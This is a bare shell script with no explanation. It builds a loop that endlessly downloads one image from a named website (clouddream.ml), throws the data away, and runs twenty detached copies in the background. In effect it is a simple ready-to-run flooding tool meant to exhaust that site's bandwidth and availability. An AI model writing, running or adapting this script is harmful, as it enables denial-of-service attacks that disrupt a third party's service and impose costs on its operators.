echo "while [ 1 ]" > _ins.sh
echo "do" >> _ins.sh
echo "wget -q -t0 -O /dev/null https://clouddream.ml/images/img-header/slider-img-5.jpg" >> _ins.sh
echo "done" >> _ins.sh
for i in `seq 1 20`
do
     nohup bash _ins.sh > /dev/null 2>&1 &
     echo "thread $i start!"
done
